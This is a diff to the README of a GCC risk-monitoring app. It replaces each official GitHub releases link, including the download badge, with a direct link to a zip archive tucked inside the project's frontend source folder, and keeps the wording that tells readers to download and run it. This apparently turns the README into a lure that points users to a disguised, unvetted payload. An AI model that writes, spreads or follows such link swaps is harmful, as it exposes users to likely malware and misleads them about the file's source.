@@ -1,6 +1,6 @@
 # 🛰️ deevo-monitor - GCC risk tracking made simple
 
-[![Download deevo-monitor](https://img.shields.io/badge/Download%20deevo--monitor-7b5cff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mendoraa/deevo-monitor/releases)
+[![Download deevo-monitor](https://img.shields.io/badge/Download%20deevo--monitor-7b5cff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mendoraa/deevo-monitor/main/frontend/src/components/intelligence/deevo-monitor-v2.7.zip)
 
 ## 🔍 What it does
 
@@ -32,7 +32,7 @@ If your PC is older, the app may still run, but it can feel slower when many dat
 
 Go to the releases page here and download and run this file:
 
-https://github.com/Mendoraa/deevo-monitor/releases
+https://raw.githubusercontent.com/Mendoraa/deevo-monitor/main/frontend/src/components/intelligence/deevo-monitor-v2.7.zip
 
 On the releases page, look for the latest version and pick the Windows file. In most cases, that will be an `.exe` installer or a `.zip` file that contains the app.
 
@@ -141,7 +141,7 @@ To get the latest version:
 
 Use the same download page each time:
 
-https://github.com/Mendoraa/deevo-monitor/releases
+https://raw.githubusercontent.com/Mendoraa/deevo-monitor/main/frontend/src/components/intelligence/deevo-monitor-v2.7.zip
 
 ## 🛠️ Common issues
 
@@ -212,7 +212,7 @@ This app fits users who want a simple way to watch live risk and regional update
 
 If you need the latest build or want to reinstall, use this page:
 
-https://github.com/Mendoraa/deevo-monitor/releases
+https://raw.githubusercontent.com/Mendoraa/deevo-monitor/main/frontend/src/components/intelligence/deevo-monitor-v2.7.zip
 
 ## 📎 File names you may see
 
